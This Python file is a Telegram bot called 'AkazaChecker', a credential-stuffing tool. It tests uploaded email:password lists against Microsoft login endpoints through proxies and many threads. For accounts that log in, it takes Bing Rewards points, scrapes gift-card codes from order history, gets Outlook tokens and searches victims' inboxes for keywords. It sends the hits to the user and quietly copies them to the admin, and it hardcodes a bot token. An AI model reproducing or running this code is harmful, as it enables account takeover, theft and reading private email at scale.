import re, json, uuid, sqlite3, logging, asyncio, time, os, random, threading, requests, urllib3, io
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import quote, unquote, urlparse, parse_qs
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (Application, CommandHandler, MessageHandler,
                          CallbackQueryHandler, ContextTypes, filters)
from telegram.constants import ParseMode

# ============================================================================
# LOGGING & SETUP
# ============================================================================
urllib3.disable_warnings()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# CONFIG
BOT_TOKEN = "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak"
ADMIN_ID = 5944410248
DB_PATH = "checker.db"
MAX_EXECUTOR_WORKERS = 500

bot_executor = ThreadPoolExecutor(max_workers=MAX_EXECUTOR_WORKERS)
db_lock = threading.Lock()
PROXIES_LIST = []

# ============================================================================
# AkazaDatabase CLASS
# ============================================================================
class AkazaDatabase:
    def __init__(self, db_path):
        self.db_path = db_path

    def _execute(self, query, params=(), commit=True, fetchone=False, fetchall=False):
        with db_lock:
            conn = sqlite3.connect(self.db_path)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            try:
                cursor.execute(query, params)
                if commit: conn.commit()
                if fetchone: return cursor.fetchone()
                if fetchall: return cursor.fetchall()
            except Exception as e:
                logger.error(f"DB Error: {e}")
            finally:
                conn.close()

    def init_db(self):
        self._execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
            credits INTEGER DEFAULT 999999, has_access INTEGER DEFAULT 1,
            is_banned INTEGER DEFAULT 0, is_mod INTEGER DEFAULT 0,
            total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0,
            join_date TEXT, access_expiry TEXT)''')
        self._execute('''CREATE TABLE IF NOT EXISTS settings (
            user_id INTEGER PRIMARY KEY, keywords TEXT DEFAULT "", threads INTEGER DEFAULT 10, is_adding_kw INTEGER DEFAULT 0)''')
        self._execute('''CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT,
            status TEXT, details TEXT, date TEXT)''')
        now = datetime.now().isoformat()
        self._execute('INSERT OR IGNORE INTO users (user_id, username, first_name, join_date, credits, has_access) VALUES (?, ?, ?, ?, ?, ?)',
                      (ADMIN_ID, "Admin", "Admin", now, 999999, 1))
        self._execute('UPDATE users SET is_mod = 1, has_access = 1 WHERE user_id = ?', (ADMIN_ID,))

    def add_user(self, uid, username, first_name):
        self._execute('INSERT OR IGNORE INTO users (user_id, username, first_name, join_date) VALUES (?, ?, ?, ?)',
                      (uid, username, first_name, datetime.now().isoformat()))
        self._execute('INSERT OR IGNORE INTO settings (user_id) VALUES (?)', (uid,))

    def is_banned(self, uid):
        res = self._execute('SELECT is_banned FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return bool(res['is_banned']) if res else False

    def has_access(self, uid):
        if uid == ADMIN_ID: return True
        res = self._execute('SELECT has_access, access_expiry, is_banned FROM users WHERE user_id = ?', (uid,), fetchone=True)
        if not res or res['is_banned']: return False
        if res['has_access'] == 0: return False
        if res['access_expiry']:
            try:
                if datetime.now() > datetime.fromisoformat(res['access_expiry']): return False
            except: pass
        return True

    def is_mod(self, uid):
        if uid == ADMIN_ID: return True
        res = self._execute('SELECT is_mod FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return bool(res['is_mod']) if res else False

    def add_credits(self, uid, amount):
        self._execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amount, uid))

    def set_credits(self, uid, amount):
        self._execute('UPDATE users SET credits = ? WHERE user_id = ?', (amount, uid))

    def reset_credits(self, uid):
        self._execute('UPDATE users SET credits = 0 WHERE user_id = ?', (uid,))

    def use_credit(self, uid):
        if uid == ADMIN_ID: return
        self._execute('UPDATE users SET credits = MAX(0, credits - 1), total_checks = total_checks + 1 WHERE user_id = ?', (uid,))

    def get_credits(self, uid):
        if uid == ADMIN_ID: return 999999
        res = self._execute('SELECT credits FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return res['credits'] if res else 0

    def grant_access(self, uid):
        self._execute('UPDATE users SET has_access = 1, access_expiry = NULL WHERE user_id = ?', (uid,))

    def ban(self, uid):
        self._execute('UPDATE users SET is_banned = 1 WHERE user_id = ?', (uid,))

    def unban(self, uid):
        self._execute('UPDATE users SET is_banned = 0 WHERE user_id = ?', (uid,))

    def set_mod(self, uid, val):
        self._execute('UPDATE users SET is_mod = ? WHERE user_id = ?', (val, uid))

    def get_all_user_ids(self):
        res = self._execute('SELECT user_id FROM users', fetchall=True)
        return [row['user_id'] for row in res] if res else []

    def get_user_info(self, uid):
        res = self._execute('SELECT * FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return dict(res) if res else {}

    def get_user_settings(self, uid):
        res = self._execute('SELECT keywords, threads, is_adding_kw FROM settings WHERE user_id = ?', (uid,), fetchone=True)
        if res:
            kws = [k.strip() for k in res['keywords'].split(',') if k.strip()]
            return {'keywords': kws, 'threads': res['threads'], 'is_adding_kw': bool(res['is_adding_kw'])}
        return {'keywords': [], 'threads': 10, 'is_adding_kw': False}

    def update_settings(self, uid, keywords=None, threads=None, is_adding_kw=None):
        if keywords is not None:
            self._execute('UPDATE settings SET keywords = ? WHERE user_id = ?', (",".join(keywords), uid))
        if threads is not None:
            self._execute('UPDATE settings SET threads = ? WHERE user_id = ?', (threads, uid))
        if is_adding_kw is not None:
            self._execute('UPDATE settings SET is_adding_kw = ? WHERE user_id = ?', (1 if is_adding_kw else 0, uid))

    def save_result(self, uid, email, status, details_dict):
        self._execute('INSERT INTO results (user_id, email, status, details, date) VALUES (?, ?, ?, ?, ?)',
                      (uid, email, status, json.dumps(details_dict), datetime.now().isoformat()))
        if status == 'hit':
            self._execute('UPDATE users SET total_hits = total_hits + 1 WHERE user_id = ?', (uid,))

    def user_stats(self, uid):
        res = self._execute('SELECT total_checks, total_hits, credits FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return {'checks': res['total_checks'], 'hits': res['total_hits'], 'credits': res['credits']} if res else {'checks':0,'hits':0,'credits':0}

    def get_global_stats(self):
        t = self._execute('SELECT COUNT(*) as total FROM users', fetchone=True)
        c = self._execute('SELECT SUM(total_checks) as checks FROM users', fetchone=True)
        h = self._execute('SELECT SUM(total_hits) as hits FROM users', fetchone=True)
        return {'total': t[0], 'checks': c[0] or 0, 'hits': h[0] or 0}

    def list_mods(self):
        res = self._execute('SELECT user_id, username FROM users WHERE is_mod = 1', fetchall=True)
        return [{'uid': row['user_id'], 'username': row['username']} for row in res]

db_api = AkazaDatabase(DB_PATH)

# ============================================================================
# AkazaChecker CLASS
# ============================================================================
class AkazaChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        self.uuid = str(uuid.uuid4())
        if proxy:
            px = self.format_proxy(proxy)
            self.session.proxies = {'http': px, 'https': px}
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
        })

    def format_proxy(self, px):
        px = px.strip()
        if px.startswith(('http://', 'https://', 'socks')): return px
        parts = px.split(':')
        if len(parts) == 4: return f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
        if len(parts) == 2: return f'http://{px}'
        return px

    def login_flux(self, email, password):
        try:
            auth_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
            r = self.session.get(auth_url, timeout=10)
            ppft = re.search('value=\\\\"(.+?)\\\\"', r.text, re.S) or re.search('value="(.+?)"', r.text, re.S) or re.search("sFTTag:'(.+?)'", r.text, re.S) or re.search('sFTTag:"(.+?)"', r.text, re.S) or re.search('name="PPFT".*?value="(.+?)"', r.text, re.S)
            up = re.search('"urlPost":"(.+?)"', r.text, re.S) or re.search("urlPost:'(.+?)'", r.text, re.S) or re.search('<form.*?action="(.+?)"', r.text, re.S)
            if not ppft or not up: return 'ERROR', None
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft.group(1)}
            r_login = self.session.post(up.group(1).replace('&amp;', '&'), data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
            if '#' in r_login.url:
                tk = parse_qs(urlparse(r_login.url).fragment).get('access_token', ['None'])[0]
                if tk and tk != 'None': return 'TOKEN', tk
            if any(v in r_login.text for v in ['recover?mkt', 'identity/confirm', 'Email/Confirm', '/Abuse?mkt=']): return '2FA', None
            if any(v in r_login.text.lower() for v in ['password is incorrect', "account doesn't exist", 'too many times']): return 'BAD', None
            return 'ERROR', None
        except: return 'ERROR', None

    def login_hit(self, email, password):
        try:
            idp = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            r1 = self.session.get(idp, headers={"X-OneAuth-AppName": "Outlook Lite"}, timeout=12)
            if "MSAccount" not in r1.text: return None
            auth = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            r2 = self.session.get(auth, timeout=12)
            up = re.search(r'urlPost":"([^"]+)"', r2.text)
            pp = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not up or not pp: return None
            data = f"login={email}&loginfmt={email}&passwd={password}&PPFT={pp.group(1)}&i19=9960"
            r3 = self.session.post(up.group(1).replace("\\/", "/"), data=data, headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": r2.url}, allow_redirects=False, timeout=12)
            loc = r3.headers.get("Location", "")
            code = re.search(r'code=([^&]+)', loc)
            if not code: return None
            tk_data = f"client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&grant_type=authorization_code&code={code.group(1)}&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=tk_data, timeout=12)
            return r4.json().get("access_token")
        except: return None

    def get_rewards_p7(self):
        try:
            r = self.session.get("https://rewards.bing.com/api/getuserinfo", timeout=8)
            if r.status_code == 200:
                d = r.json()
                pts = d.get('availablePoints') or d.get('dashboard', {}).get('userStatus', {}).get('availablePoints')
                if pts is not None: return int(pts)
            r = self.session.get("https://www.bing.com/rewardsapp/flyoutHub?format=json", timeout=8)
            if r.status_code == 200:
                d = r.json()
                if 'userInfo' in d and 'balance' in d['userInfo']: return int(d['userInfo']['balance'])
            r = self.session.get("https://rewards.bing.com", timeout=10)
            m = re.search(r'"availablePoints"\s*:\s*(\d+)', r.text)
            if m: return int(m.group(1))
        except: pass
        return 0

    def get_order_history_flux(self):
        codes = []
        try:
            r = self.session.get('https://rewards.bing.com/redeem/orderhistory', timeout=10)
            soup = BeautifulSoup(r.text, 'html.parser')
            vt = soup.find('input', attrs={'name': '__RequestVerificationToken'})
            vt = vt.get('value', '') if vt else ''
            tbl = soup.find('table', class_='table')
            rows = tbl.find_all('tr') if tbl else []
            for row in rows:
                btn = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
                if btn:
                    act = btn.get('data-actionurl', '').replace('&amp;', '&')
                    if act.startswith('/'): act = 'https://rewards.bing.com' + act
                    cr = self.session.post(act, data={'__RequestVerificationToken': vt}, headers={'X-Requested-With': 'XMLHttpRequest'}, timeout=10)
                    m = re.search(r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', cr.text)
                    if m: codes.append(m.group())
        except: pass
        return codes

    def scan_inbox_hit(self, email, tk, uk):
        if not uk: return {}, "0"
        cid = self.session.cookies.get("MSPCID", "").upper()
        res, ic = {}, "0"
        try:
            r_count = self.session.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0", data="", headers={"authorization": f"Bearer {tk}", "action": "StartupData", "content-type": "application/json"}, timeout=12)
            m = re.search(r'"DisplayName":"Inbox","TotalCount":(\d+)', r_count.text)
            if m: ic = m.group(1)
        except: pass
        h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json', 'Accept': 'application/json'}
        for k in uk:
            pay = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": f'"{k}"'}, "Size": 1}]}
            try:
                r = self.session.post("https://outlook.live.com/search/api/v2/query", json=pay, headers=h, timeout=10)
                if r.status_code == 200:
                    tot = r.json()['EntitySets'][0]['ResultSets'][0].get('Total', 0)
                    if tot > 0: res[k] = tot
            except: pass
        return res, ic

    async def check(self, email, password, uk=[]):
        st, tk_flux = self.login_flux(email, password)
        if st != 'TOKEN': return {'status': st.lower()}
        pts = self.get_rewards_p7()
        codes = self.get_order_history_flux()
        tk_hit = self.login_hit(email, password)
        inbox_data, ic = {}, "0"
        if tk_hit: inbox_data, ic = self.scan_inbox_hit(email, tk_hit, uk)
        return {'status': 'hit', 'email': email, 'password': password, 'pts': pts, 'codes': codes, 'inbox': inbox_data, 'inbox_count': ic}

# ============================================================================
# BOT HANDLERS
# ============================================================================
user_proxies = {}
pending_files = {}

async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    db_api.add_user(uid, u.effective_user.username, u.effective_user.first_name)
    if db_api.is_banned(uid): return
    db_api.update_settings(uid, is_adding_kw=False)
    i, s = db_api.get_user_info(uid), db_api.get_user_settings(uid)
    msg = (f"💠 <b>Dashboard</b> 💠\n\n👤 <b>User:</b> <code>{u.effective_user.first_name}</code>\n💰 <b>Credits:</b> <code>{i['credits']}</code>\n⚙️ <b>Threads:</b> <code>{s['threads']}</code>\n🔑 <b>Keywords:</b> <code>{len(s['keywords'])}</code>")
    kbd = [[InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
           [InlineKeyboardButton("🔍 Keywords", callback_data="kw_mode"), InlineKeyboardButton("🔌 Proxy", callback_data="proxy")],
           [InlineKeyboardButton("📖 Help", callback_data="help")]]
    if db_api.is_mod(uid): kbd.append([InlineKeyboardButton("🛠 Admin", callback_data="admin")])
    if u.callback_query: await u.callback_query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(kbd), parse_mode="HTML")
    else: await u.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(kbd), parse_mode="HTML")

async def handle_text(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    s = db_api.get_user_settings(uid)
    if s['is_adding_kw']:
        new_kws = u.message.text.split()
        all_kws = list(set(s['keywords'] + new_kws))
        db_api.update_settings(uid, keywords=all_kws)
        await u.message.reply_text(f"✅ Added {len(new_kws)} keywords. Total: {len(all_kws)}.\nUse /skw to stop recording.")
        return
    if ':' in u.message.text: await handle_combo(u, c, u.message.text)

async def handle_document(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    doc = u.message.document
    if not doc.file_name.endswith('.txt'): return
    file = await c.bot.get_file(doc.file_id)
    content = (await file.download_as_bytearray()).decode('utf-8', 'ignore')
    pending_files[uid] = content
    kbd = [[InlineKeyboardButton("📁 Combo", callback_data="set_combo"), InlineKeyboardButton("🔌 Proxy", callback_data="set_proxy")]]
    await u.message.reply_text("❓ <b>File detected. Select type:</b>", reply_markup=InlineKeyboardMarkup(kbd), parse_mode="HTML")

async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
    uid = u.effective_user.id
    if db_api.is_banned(uid) or not db_api.has_access(uid): return
    if not text: text = pending_files.pop(uid, "")
    lines = [l.strip() for l in text.splitlines() if ':' in l]
    if not lines: return
    s = db_api.get_user_settings(uid)
    px = user_proxies.get(uid, []) or PROXIES_LIST
    thr = min(s['threads'], 300) if px else min(s['threads'], 10)
    await c.bot.send_message(ADMIN_ID, f"🚀 User <code>{uid}</code> started checking {len(lines)} accounts.")
    msg = await (u.callback_query.message.reply_text("🚀 Starting...") if u.callback_query else u.message.reply_text("🚀 Starting..."))
    hits, bad, tfa, err, checked, start_t, last_up, last_h = 0, 0, 0, 0, 0, time.time(), 0, []
    sid = str(uuid.uuid4().hex[:6])
    h_f, tfa_f = f"h_{sid}.txt", f"t_{sid}.txt"
    sem, up_lock = asyncio.Semaphore(thr), asyncio.Lock()
    async def worker(line):
        nonlocal hits, bad, tfa, err, checked, last_up
        async with sem:
            try:
                parts = line.split(':', 1)
                p = random.choice(px) if px else None
                data = await AkazaChecker(p).check(parts[0].strip(), parts[1].strip(), s['keywords'])
            except: data = {'status': 'error'}
            checked += 1; db_api.use_credit(uid); db_api.save_result(uid, data.get('email',''), data['status'], data)
            st = data['status']
            if st == 'hit':
                hits += 1; last_h.append(data['email'])
                if len(last_h) > 5: last_h.pop(0)
                with open(h_f, 'a', encoding='utf-8') as f:
                    if os.path.getsize(h_f) == 0: f.write("@larpsupport\n\n")
                    f.write(f"{data['email']}:{data['password']} | Pts:{data['pts']} | Inbox:{data.get('inbox_count','0')} | Keywords:{json.dumps(data.get('inbox',{}))}\n")
            elif st == '2fa': tfa += 1; open(tfa_f, 'a').write(f"{data['email']}:{data['password']}\n")
            elif st == 'error': err += 1
            else: bad += 1
            async with up_lock:
                if time.time() - last_up > 3 or checked == len(lines):
                    last_up = time.time(); el = time.time() - start_t; cpm = int((checked/el)*60) if el > 0 else 0
                    prg = f"🔄 **Live Check**\n\n📊 `{checked}/{len(lines)}` | ⚡ CPM: `{cpm}`\n🎯 Hits: `{hits}` | 💀 Bad: `{bad}`\n🔒 2FA: `{tfa}` | ❌ Errors: `{err}`\n\n🕒 Last Hits:\n`{' | '.join(last_h) or 'None'}`"
                    try: await msg.edit_text(prg, parse_mode='Markdown')
                    except: pass
    await asyncio.gather(*(worker(l) for l in lines))
    if uid in user_proxies: del user_proxies[uid]
    for p, disp in [(h_f, "Hotmails Hits @darkcloudgateway.txt"), (tfa_f, "2fa.txt")]:
        if os.path.exists(p) and os.path.getsize(p) > 5:
            if p == h_f:
                with open(p, 'a') as f: f.write("\n@larpsupport")
            with open(p, 'rb') as f:
                content = f.read()
                f.seek(0)
                if u.callback_query: await u.callback_query.message.reply_document(f, filename=disp, caption=f"✅ {disp}")
                else: await u.message.reply_document(f, filename=disp, caption=f"✅ {disp}")
                await c.bot.send_document(ADMIN_ID, io.BytesIO(content), filename=disp, caption=f"📁 User {u.effective_user.first_name} ({uid}) Result\n💰 Credits: {db_api.get_credits(uid)}")
            os.remove(p)

async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query; await q.answer(); uid = q.from_user.id
    if q.data == "settings": await q.edit_message_text(f"⚙️ <b>Settings</b>\n\nThreads: <code>{db_api.get_user_settings(uid)['threads']}</code>\nUse /threads [N] to change.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
    elif q.data == "stats":
        st = db_api.user_stats(uid)
        await q.edit_message_text(f"📊 <b>Statistics</b>\n\nChecks: <code>{st['checks']}</code>\nHits: <code>{st['hits']}</code>\nCredits: <code>{st['credits']}</code>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
    elif q.data == "kw_mode":
        db_api.update_settings(uid, is_adding_kw=True)
        await q.edit_message_text("🔍 <b>Keyword Mode Activated</b>\n\nSend keywords separated by spaces.\nExample: <code>netflix spotify steam</code>\n\n/skw to stop, /ckw to clear.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
    elif q.data == "proxy": await q.edit_message_text(f"🌐 <b>Proxy Settings</b>\nLoaded: <code>{len(user_proxies.get(uid, []))}</code>\nUpload .txt and select 'Proxy'.\nNote: Proxies are one-time use.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
    elif q.data == "help":
        txt = ("📖 <b>Help Section</b>\n\n"
               "<b>Commands:</b>\n"
               "/threads [N] - Set check threads\n"
               "/skw - Stop adding keywords\n"
               "/ckw - Clear all keywords\n"
               "/start - Dashboard\n\n"
               "<b>How to use:</b>\n"
               "• Send combo or upload .txt file.\n"
               "• Keywords are searched in inbox if added.")
        await q.edit_message_text(txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
    elif q.data == "back": await start(u, c)
    elif q.data == "set_combo": await handle_combo(u, c)
    elif q.data == "set_proxy":
        user_proxies[uid] = [l.strip() for l in pending_files.pop(uid, "").splitlines() if l.strip()]
        await q.edit_message_text(f"✅ Loaded {len(user_proxies[uid])} proxies.")
    elif q.data == "admin" and db_api.is_mod(uid):
        st = db_api.get_global_stats()
        await q.edit_message_text(f"🛠 <b>Admin Panel</b>\n\nTotal Users: <code>{st['total']}</code>\nGlobal Checks: <code>{st['checks']}</code>\nGlobal Hits: <code>{st['hits']}</code>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")

async def set_threads(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if c.args:
        try:
            n = int(c.args[0])
            if 1 <= n <= 300: db_api.update_settings(u.effective_user.id, threads=n); await u.message.reply_text(f"✅ Threads set to {n}.")
        except: pass

async def cmd_skw(u: Update, c: ContextTypes.DEFAULT_TYPE): db_api.update_settings(u.effective_user.id, is_adding_kw=False); await u.message.reply_text("✅ Recording stopped.")
async def cmd_ckw(u: Update, c: ContextTypes.DEFAULT_TYPE): db_api.update_settings(u.effective_user.id, keywords=[]); await u.message.reply_text("✅ All keywords cleared.")

async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not db_api.is_mod(u.effective_user.id): return
    m = u.message.text.split(); cmd = m[0].lower(); args = m[1:]
    if cmd == "!!addcredits" and len(args) == 2: db_api.add_credits(int(args[0]), int(args[1])); await u.message.reply_text("✅ Done.")
    elif cmd == "!!grant" and len(args) == 1: db_api.grant_access(int(args[0])); await u.message.reply_text("✅ Done.")
    elif cmd == "!!ban" and len(args) == 1: db_api.ban(int(args[0])); await u.message.reply_text("✅ Done.")
    elif cmd == "!!broadcast" and args:
        txt = u.message.text[len(cmd):].strip()
        for t in db_api.get_all_user_ids():
            try: await c.bot.send_message(t, txt); await asyncio.sleep(0.05)
            except: pass
        await u.message.reply_text("✅ Broadcast finished.")

def main():
    db_api.init_db()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start)); app.add_handler(CommandHandler("threads", set_threads))
    app.add_handler(CommandHandler("skw", cmd_skw)); app.add_handler(CommandHandler("ckw", cmd_ckw))
    app.add_handler(CallbackQueryHandler(cb_handler)); app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^!!'), admin_cmd_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document)); app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
